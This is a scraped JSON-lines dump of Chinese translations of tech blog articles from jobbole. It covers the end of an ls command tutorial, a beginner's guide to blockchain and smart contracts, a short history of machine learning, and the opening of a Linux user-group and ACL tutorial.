src=\"http://jbcdn2.b0.upaiyun.com/2017/12/e0cedec01301971b3bdce2b4c4adc812.png\" alt=\"\"></p>\n<h4>20. 打印ls命令版本</h4>\n<p>使用–version参数打印它。</p>\n<p>$ ls –version</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/1c7dfc9fd3544b5825832d006d295ec4.png\" alt=\"\"></p>\n<h3>总结</h3>\n<p>这些是在日常操作中会使用到的参数。当然你总可以输入<strong>man ls</strong> 或者 <strong>ls –help</strong> 来查询ls的手册页</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113277\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113277votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113277\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/82d53cc686d85d92c9f78d84551efefe19f368cb.jpg"}
{"url_object_id": "df1b3184923f603d7a7a92af3546ce30", "title": "区块链初学者指南", "url": "http://blog.jobbole.com/113467/", "create_date": "2018/01/12", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/f758d0488e42bad4bf6c57205e400bac.png"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 0, "tags": "IT技术,区块链", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://hackernoon.com/a-beginners-guide-to-blockchain-d04266844e7\">Febin John James</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/a-beginners-guide-to-blockchain\">oschina/LeoXu</a>   </div><div>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/f758d0488e42bad4bf6c57205e400bac.png\" width=\"1200\" height=\"495\"></p>\n<p>我并不明白为什么人们会觉得要理解<a href=\"http://amzn.to/2EtascE\" target=\"_blank\" rel=\"nofollow\">区块链</a>会有点难，而我也想知道为什么自己并没有。那是在 2013 年，我第一次听说有比特币这个东西（是的，知道的太晚啦）。我穷得连一个都买不起，看到这儿你也许已经对此文无爱了。后来，我想要去了解一下它所依赖的底层技术，也就<a href=\"http://amzn.to/2EtascE\" target=\"_blank\" rel=\"nofollow\">区块链</a>。 不过因为太忙了，所以迟迟没有开始(那就并不存在什么 开始不开始了)。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/09b9cf95aeab080a265cbe2de97f5f53.png\" width=\"506\" height=\"499\"></p>\n<h3><em>那么这个 “区块链”到底是什么呢?</em></h3>\n<p>其实是两个东西：一个是区块一个是链。说玄虚一点，就是一链子的区块。因为它是存在于计算机中的东西，所以我们可以厘定它的一个物理形态是啥样子的，就是数字信息被分成一个一个区块然后把这些区块链接起来。举个例子，下图中的方块，每一个都表示一个国家，而且每一个都包含了对应国家的城市名称。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/326c76d0690f6998d2c601f0624bcfdb.png\" width=\"577\" height=\"246\"></p>\n<p>等等，其实还有更多东西来着。这里的每一个方块都一个叫做哈希的东西。一个哈希就是一串字符 (比如 “1hi515AHA5H” )。哈希是根据方块里面所包含的信息来得到的。 U.S.A 的方块拥有 New York, Los Angeles, 还有 Chicago 这几个城市，所以它的哈希就是像 “NYLAC” 的东西了 (技术上其实远非如此，但你理会精要就行了)。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/ee35d08d4e9f32eabbdf3bc7a8aedea9.png\" width=\"588\" height=\"255\"></p>\n<p>每一个接续的方块都会包含前一个方块的哈希，所以这个就是（强制性的）将它们绑到一起的纽带。如果有人擅自篡改了第一个方块，加入了城市 Boston，那么新的哈希就会是 “NYLACB”，然而后面接续的 India 这个方块已经存着的哈希还是 “NYLAC”，这种不匹配就会把链条打断。所以哈希的目的就是确保没有人可以篡改区块。</p>\n<p><strong><em>那如果有人修改了一个方块的内容，然后把后面的接续方块的哈希也一并更新会如何呢?</em> </strong>这也是有可能的，不过有一件事情我还没有告诉你。区块链的数据并不只是存在于仅仅一台计算机里面。一台计算机里面的区块链数据并不能骗到人，因为它会被复制到网络中每一个用户的计算机里面去。如果你加入了一个区块链网络，那么你的计算机就会去下载这些区块数据，如果有人篡改了他拥有的版本，整个网络也会考虑占多数的人的计算机上所拥有的版本才是正确的。</p>\n<p>还有一件事，在一个区块链网络中，不仅是数据，就连整个系统的程序都被复制到了所有的电脑中。大多数互联网应用都是集中话的，比如 Facebook，她的数据和程序都被放在了她的服务器上，你的计算机会从 Facebook 的服务器上获取到你一个人需要知道的信息。但在区块链的世界理，就没有存在于中心的东西，它依赖的是用户的计算机来容纳自己的程序。是的，这就意味着，如果整个区块链网络中的每一台电脑都关机了，那么这个区块链系统就死翘翘了。</p>\n<h3>公共区块链</h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/7dc1523fe13c77bc057309f8cbf6cde0.png\" width=\"587\" height=\"265\"></p>\n<p><strong><em>这是不是就意味着区块链系统其实就是由一群心怀善意自愿让他们的计算机保持运行的人来组成的呢? 还有这些防篡改的区块是用来干嘛的呢?</em></strong></p>\n<p>区块链网络的功效不胜枚举。比特币是一种数据货币和一个支付系统。它所有的防篡改区块中所保存的就是全部交易的分类账。那些贡献了他们自己的计算机的人被称为矿工。系统会给他们提供比特币作为奖励。</p>\n<p>Ethereum 有意向附加功能。它可以承载你的代码，从头开始发展出一个区块链系统，而要构建一个属于你自己的系统也许会非常地困难（记住这得看有人为你牺牲他们的计算机运行能力才行哦）。Ethereum 就维护着这些耗损巨大的运算能力，而你则需要为这些计算消耗买单。</p>\n<p>区块链应用并不非得是支付系统或者加密货币。它可以任何东西，像是一个社交网络，一个像 <a href=\"https://tokensale.liveedu.tv/\" target=\"_blank\" rel=\"nofollow\">LiveEdu</a> 这样的学习平台，等等。</p>\n<h3>私有区块链</h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/dcf2c797be62efe817e265508f012f1b.png\" width=\"284\" height=\"85\"></p>\n<p><strong><em>Bitcoin, Ethereum 等等这些都是公共区块链的例子，任何人都可以成为其中的一分子。那如果我们想要有一个私有的区块链网络该如何呢？有些人想要一个私有的区块链是想干嘛呢？那就来瞧瞧下面的故事吧。</em></strong></p>\n<p><strong><em>Mark 和 Sara</em></strong></p>\n<p>Mark 已经五个月没交房租了，当 Sara 找他要的时候，他就说晚点会给她。她付不起律师费，而法院强制执行诉讼就需要8个月甚至一年，所以唯一的选择就是去说服 Mark。</p>\n<p><strong><em>Joe 的生意</em></strong></p>\n<p>Joe 是一个商人，他经常要跟不同的公司做生意。几个月之前他和一家零售商签了一份合同，尽管合同条款都已经履约了，可零售商确拒绝付款。这帮人利用法律制度中的漏洞来游说 Joe，想以此达到少付钱的目的。Joe 在这以前就是有这方面经验的，在某些情况下，他会找法院求助，但这样做所耗费的时间和金钱却要损失他自己的利润。</p>\n<p><strong><em>我们该如何帮助 Sara 和 Joe 呢?</em></strong></p>\n<p>我们是不是能在其它地方解决这个问题呢? 在 Sara 遇到的这种情况中，我们需要让 Mark  按月支付房租，这其实就是一个基于时间的触发机制。你的日历程序使用这样的触发器来给你提供预设事件的通知。</p>\n<p>在 Joe 遇到的场景中，一旦合约中的条款都满足了，当事人就得付款，这其实就是一个基于条件的触发机制。你想想上次从 Amazon 买电子书的时候，是不是得先确认付款了，Amazon 才会把电子书发给你？</p>\n<p>重点是，计算机程序会始终如一的执行诸如此类的指令。当你点击着这篇文章，向下滚动，诸如这类的操作，它也会照着执行不误。为了能帮助到 Sara ，我们需要将合同的条款转变成代码。</p>\n<p><strong><em>Sara 和 Mark 之间所订立的智能合同的伪代码</em></strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c0757e33292634828\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nIf today’s date is 30th and rent is not paid then\r\nTransfer $500 from Mark’s account to Sara’s account</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c0757e33292634828-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c0757e33292634828-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c0757e33292634828-1\"><span class=\"crayon-st\">If</span> <span class=\"crayon-i\">today</span>’<span class=\"crayon-i\">s</span> <span class=\"crayon-i\">date</span> <span class=\"crayon-st\">is</span> <span class=\"crayon-cn\">30th</span> <span class=\"crayon-st\">and</span> <span class=\"crayon-i\">rent</span> <span class=\"crayon-st\">is</span> <span class=\"crayon-st\">not</span> <span class=\"crayon-i\">paid</span> <span class=\"crayon-st\">then</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c0757e33292634828-2\"><span class=\"crayon-i\">Transfer</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">500</span> <span class=\"crayon-i\">from</span> <span class=\"crayon-i\">Mark</span>’<span class=\"crayon-i\">s</span> <span class=\"crayon-i\">account</span> <span class=\"crayon-st\">to</span> <span class=\"crayon-i\">Sara</span>’<span class=\"crayon-i\">s</span> <span class=\"crayon-v\">account</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>可是我们在哪儿部署这些代码呢? 它就应该被部署到所有参与者的计算机上。Sara 的还有 Mark 的银行都会是这一个私有区块链网络的一部分。Joe 和 Sara 会签署一份编码的协议(也就是智能合同)，然后这份协议会被分发到网络中去，Mark 的和 Sara 的银行都会有一份拷贝。在每个月的 30 号，当时钟跳动到 12 点整，协议好的金额就会从 Mark 的账户转移到 Sara 的账户上去。Joe 也开始使用智能合同来强制让他的客户支付协议好的货款。</p>\n<blockquote><p>Sara 高兴了，因为她再也不用去烦心 Mark 会不会如约付房租了。Joe 也高兴，因为他也不用找法院要说法了，省下这些精力，他可以继续发展自己的生意了。</p></blockquote>\n<p>私有区块链只限于业务中涉及到的相关各方，因此 Joe 不会是 Sara 和 Mark 所属区块链网络的一部分。</p>\n<h3>前行之路</h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/38e666d2c9a39c10ef030ceebb769262.png\" width=\"447\" height=\"573\"></p>\n<p>现在你对此已经有点概念了，也许应该尝试一下 <a href=\"https://www.edx.org/course/blockchain-business-introduction-linuxfoundationx-lfs171x\" target=\"_blank\" rel=\"nofollow\">edX 上的课程</a>(免费的哦)，它会教你怎么在区块链上构建应用。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113467\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113467votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113467\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/ea1c3434ff90c4ebce5f7f45d3293c6309a42a0a.jpg"}
{"url_object_id": "5e4d58414069c0e60dc714bf042ec15d", "title": "如果你还不了解机器学习的简史，请看这篇文章", "url": "http://blog.jobbole.com/113180/", "create_date": "2017/12/05", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/914a7f9323808e5b11330f275e0ac4c8.jpg"], "praise_nums": 4, "comment_nums": 8, "favor_nums": 7, "tags": "IT技术,机器学习", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/nemoland\">李大萌</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://www.erogol.com/brief-history-machine-learning/\">Eren Golge</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：全面介绍机器学习的发展史，从感知机、神经网络、决策树、SVM、Adaboost到随机森林、Deep Learning。<b></b></p>\n<p><img class=\"alignnone\" src=\"http://www.erogol.com/wp-content/uploads/2014/05/test.jpg\" width=\"1793\" height=\"1104\"></p>\n<p>自科学技术和人工智能最初发展开始，科学家Blaise Pascal和Von Leibniz就思考着如何制造一台像人类一样具有智力的机器。 著名作家朱尔斯·凡尔纳，弗兰克·鲍姆（绿野仙踪），玛丽·雪莱（科学怪人），乔治·卢卡斯（George Lucas）（星球大战）梦想着具有人类行为的物种存在，甚至拥有在不同的环境中能战胜人类的技能。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.erogol.com/wp-content/uploads/2014/05/Arts_et_Metiers_Pascaline_dsc03869.jpg\" width=\"392\" height=\"215\"></p>\n<p style=\"text-align: center;\">帕斯卡机器执行减法和求和- 1642</p>\n<p>机器学习是人工智能最重要发展分支之一，在科研领域和工业界都是非常热门的课题。企业和学校投入大量的资源来做提升知识面。最近，该领域在许多不同任务上取得了非常可观的结果，与人类的表现（交通标志的识别，机器学习达到了98.98％ – 已经超过了人类）相当。</p>\n<p>在这里，我想分享一下机器学习发展一个粗略的时间表，并且标记了一些里程碑，但并不完整。此外，在阅读本文所有的论断时，都请在前自行脑补一句：“据我所知”。</p>\n<p>普遍推广机器学习的第一人是Hebb，他在1949年提出了基于神经心理学习方法，被称为Hebbian学习理论。通过简单的解释，研究递归神经网络（RNN）节点之间的相关性。它记录网络上的共性，像记忆一样工作。这个论点正式地表达是这样：</p>\n<blockquote><p>我们假设反射活动（或“踪迹”）的持续性或重复性会诱导细胞的持续性变化，增加其稳定性…当细胞A的轴突足够接近细胞B时，就能反复或持续刺激细胞B。此时，会在其中一个细胞或者两者中发生一些生长过程或代谢变化，来增加A的效率[1]。</p></blockquote>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.erogol.com/wp-content/uploads/2015/11/us__en_us__ibm100__700_series__checkers__620x350.jpg\" width=\"620\" height=\"350\"></p>\n<p style=\"text-align: center;\">Arthur Samuel</p>\n<p>在1952年，IBM的亚瑟·塞缪尔（Arthur Samuel）开发了一个西洋棋的程序。 该程序能够通过棋子的位置学习一个隐式模型，为下一步棋提供比较好的走法。 塞缪尔与这个程序对局了很多次，并观察到这个程序在经过一段时间的学习后可以发挥得更好。</p>\n<p>塞缪尔用这个程序驳倒了机器无法超越书面代码，并像人类一样学习模式的论断。 他创造并定义了“机器学习”：</p>\n<blockquote><p>机器学习是一个能使计算机不用显示编程就能获得能力的研究领域。</p></blockquote>\n<p><img class=\"alignnone aligncenter\" src=\"http://csis.pace.edu/~ctappert/srd2011/photos/Rosenblatt-ratlab.jpg\" width=\"453\" height=\"681\"></p>\n<p style=\"text-align: center;\">F. Rosenblatt</p>\n<p>1957年，Rosenblatt再次提出以神经科学为背景的第二个机器学习模型——感知器，它与今天的机器学习模型更像。当时，这是非常激动人心的发现，实际上它比Hebbian的想法更容易实现。 Rosenblatt用下面几句话介绍了感知器模型：</p>\n<blockquote><p>感知器模型的设计是针对于一般智能系统的一些基本特性，而不会纠缠于一些特定生物体通常情况下未知的特性。[2]</p></blockquote>\n<p>3 年后，Widrow [4]发明的Delta学习规则载入机器学习史册，该规则很快被用作感知器训练的实践程序。它也被称为最小二乘问题。这两个想法的结合创造了一个很好的线性分类器。 然而，感知器模型的热度在1969年被Minsky [3]所取代。他提出了著名的XOR问题，感知器无法对线性不可分割的数据进行分类。 这是Minsky对神经网络社区的反驳。 此后，神经网络的研究一直止步不前，到在80年代才有所突破。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.cs.ru.nl/~ths/rt2/col/h10/draw-LTUdecis.GIF\" width=\"477\" height=\"168\"></p>\n<p style=\"text-align: center;\">面向不可线性分割数据的 XOR 问题</p>\n<p>尽管早在1973年由Linnainmaa [5] 以“反向自动差异化模式”为名提出了BP思想，但是直到1981年，Werbos [6]才提出将神经网络特定反向传播（BP）算法应用到多层感知器（MLP）。BP仍然是当今神经网络架构的关键组成部分。有了这些新想法，神经网络的研究再次加速。1985年至1986年间，神经网络研究人员相继提出了采用BP训练多层感知器（MLP）的理念（Rumelhart，Hinton，Williams [7] – Hetch，Nielsen [8]）</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.erogol.com/wp-content/uploads/2014/05/Hetch_Nielsen_NN.png\" width=\"891\" height=\"754\"></p>\n<p style=\"text-align: center;\">From Hetch and Nielsen [8]</p>\n<p>另一个学派，在1986年，J.R.Quinlan [9]提出了另一个非常著名的ML算法，我们称之为决策树，更具体地说是ID3算法。这是机器学习另一个主流的闪光点。此外，ID3以软件的形式发布，能够以简单的规则及其明确的推论更好地应用到实际生活中，与黑匣子神经网络模型相反。</p>\n<p>在ID3之后，社区探索了很多不同的可用方案和算法改进（例如ID4，回归树，CART …），而且仍然是机器学习中的活跃话题之一。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.erogol.com/wp-content/uploads/2014/05/Quinlan_ID3.png\" width=\"631\" height=\"445\"></p>\n<p style=\"text-align: center;\">图：一个简单的决策树</p>\n<p>机器学习领域最重要突破之一是Vapnik和Cortes [10]在1995年提出的支持向量机（网络）（SVM），它具有非常强的理论论证和实证结果。SVM将机器学习社区分为NN（神经网络）和SVM两个派别。 然而在2000年左右，SVM内核化版本提出之后，NN在这两个派别之间的竞争并不容易（我无法找到关于该主题的第一篇文章）。SVM在很多之前用NN模型解决的问题上得出了最佳结果。 此外，与NN模型相比，SVM能够充分利用凸优化，泛化边际理论和内核化的所有深奥知识。 因此，它可以从不同学科中获得巨大的推动力，促进理论和实践的快速发展。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.erogol.com/wp-content/uploads/2014/05/SVM_Vapnik.png\" width=\"1036\" height=\"583\"></p>\n<p style=\"text-align: center;\">From Vapnik and Cortes [10]</p>\n<p>NN模型受到的另一次重创是1 9 9 1年Hochreiter的论文[40]和2001年Hochreiter等人的论文[11]，表明在使用BP算法时，NN单位饱和后会发生梯度损失。简单来说，训练NN模型时由于单位饱和，在迭代超过一定数量后冗余，因此NN非常倾向于在短时间的时期过度拟合。</p>\n<p>不久之前，Freund和Schapire在1997年提出了另一个实体机器学习模型，该模型采用增强的弱分类器组合，称为Adaboost。当时给这项工作的作者颁发了戈德尔奖。 Adaboost通过易于训练的弱分类器进行训练，给那些难的样本更高的权重。这种模型是许多不同任务的基础，如面部识别和检测。它也是PAC（Probably Approximately Correct）理论的一种实现。通常，所谓的弱分类器被Adaboost选为简单的判决树（单个决策树节点）。他们这样介绍Adaboost;</p>\n<blockquote><p>我们研究的模型可以解释为一个广泛的，抽象的扩展的研究在线预测模型到一般决策理论的设置[11]</p></blockquote>\n<p>2001年，Breiman [2001]探索了另一个综合模型，该模型集合了多个决策树，其中每个决策树的训练集都是从实例集合中随机选择的，每个节点的特征都是从特征集合随机选择的。基于这些特性，该模型被称为随机森林（RF）。RF从理论上和实际上都证明不会产生过拟合。甚至AdaBoost在数据集中有过拟合和离群点时，随机森林能有更好的鲁棒性（有关RF的更多详细信息，请参阅我的旧帖子http://www.erogol.com/randomness-randomforests/）。随机森林在许多不同的领域，如Kaggle比赛中也有很出色的表现。</p>\n<p>随机森林是树预测因子的组合，每棵树取决于独立采样的随机向量，并且森林中的所有树都具有相同的分布。森林的泛化误差a随着森林中树木数量增多而收敛[12]</p>\n<p>随着时间向今天靠近，神经网络（NN）的一个新时代——深度学习已经被商业化了。这个短语只是指具有许多广泛连续层的NN模型。三层的NN模型崛起大致在2005年，由近期和现在的Hinton，LeCun，Bengio，Andrew Ng和诸多大师结合了许多不同的发现。下面我列举了一些机器学习领域重要的概念（我猜，我将专门为深度学习写一篇文章）;</p>\n<ul>\n<li>GPU编程</li>\n<li>卷积NN [18] [20] [40]</li>\n<li>解卷积网络[21]</li>\n<li>算法优化</li>\n<li>随机梯度下降[19] [22]</li>\n<li>BFGS和L-BFGS [23]</li>\n<li>共轭梯度下降[24]</li>\n<li>反向传播[40] [19]</li>\n<li>整流器单元</li>\n<li>稀疏性[15] [16]</li>\n<li>Dropout网 [26]</li>\n<li>Maxout网[25]</li>\n<li>无监督的NN模型[14]</li>\n<li>深度信念网[13]</li>\n<li>堆叠式自动编码器[16] [39]</li>\n<li>去噪NN模型[17]</li>\n</ul>\n<p>结合所有这些想法和未列出的想法，NN 模型能够在对象识别、语音识别、NLP等不同的任务中击败之前的技术。但是应该注意的是，这并不意味着其他ML流派的结束。虽然深度学习的成功故事还在接二连三的上演，但是它在训练成本和调整模型的外部参数方面还有很多争议。此外，由于其简单性，SVM的使用依然非常普遍。 （据说可能会引起很大争议）</p>\n<p>在结束之前，我需要再介绍一个比较前沿的 ML 趋势。随着WWW和社交媒体的发展，一个新的术语——大数据出现了，并大大影响了ML研究。由于大数据的数据规模都很大，许多强大的ML算法在相当多的系统中（当然对大型技术公司来说不是这样）是无用的。因此，研究人员提出了一套新的简单模型——dubbed Bandit Algorithms，被称为强盗算法[27 – 38]（通常都基于在线学习），使学习更容易，适应大规模问题。</p>\n<p>我只是总结了机器学习的发展史。如果你发现错误，不足或没有添加引用的地方，请不要犹豫，可以通过各种方式告诉我。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113180\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113180votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113180\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 8 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland\">李大萌</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            码农一枚        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/nemoland\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/nemoland/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 25</a> · <a title=\"QQ：727231337\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：qq_nemo\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/0104e7c14a36650ad69f34f21bb577491ca53eda.jpg"}
{"url_object_id": "ecb07428446047245a1f32f8ff966176", "title": "如何在 Linux 系统中通过用户组来管理用户", "url": "http://blog.jobbole.com/113200/", "create_date": "2017/12/06", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2014/04/e260ae4f5d153b25be87819b25ff0577.jpg"], "praise_nums": 2, "comment_nums": 0, "favor_nums": 1, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linux.com/learn/intro-to-linux/2017/12/how-manage-users-groups-linux\">Jack Wallen</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9114-1.html\">Linux中国/imquanquan</a>   </div><blockquote><p>本教程可以了解如何通过用户组和访问控制表（ACL）来管理用户。</p></blockquote>\n<p>当你需要管理一台容纳多个用户的 Linux 机器时，比起一些基本的用户管理工具所提供的方法，有时候你需要对这些用户采取更多的用户权限管理方式。特别是当你要管理某些用户的权限时，这个想法尤为重要。比如说，你有一个目录，某个用户组中的用户可以通过读和写的权限访问这个目录，而其他用户组中的用户对这个目录只有读的权限。在 Linux 中，这是完全可以实现的。但前提是你必须先了解如何通过用户组和访问控制表（ACL）来管理用户。</p>\n<p>我们将从简单的用户开始，逐渐深入到复杂的访问控制表（ACL）。你可以在你所选择的 Linux 